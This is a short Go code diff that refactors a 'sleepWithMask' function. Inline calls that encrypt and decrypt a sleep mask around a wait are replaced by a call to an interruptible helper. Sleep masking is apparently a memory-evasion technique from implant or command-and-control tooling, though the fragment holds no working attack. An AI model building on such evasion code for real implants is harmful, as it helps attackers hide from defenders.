@@ -91,8 +91,5 @@ func sleepMaskPolicyEnabled() bool {
 }
 
 func sleepWithMask(d time.Duration) {
-	activeSleepMask.Encrypt()
-	activeSleepMask.BeforeSleep(uintptr(d.Milliseconds()))
-	activeSleepMask.AfterWake()
-	activeSleepMask.Decrypt()
+	sleepWithMaskInterruptible(d)
 }
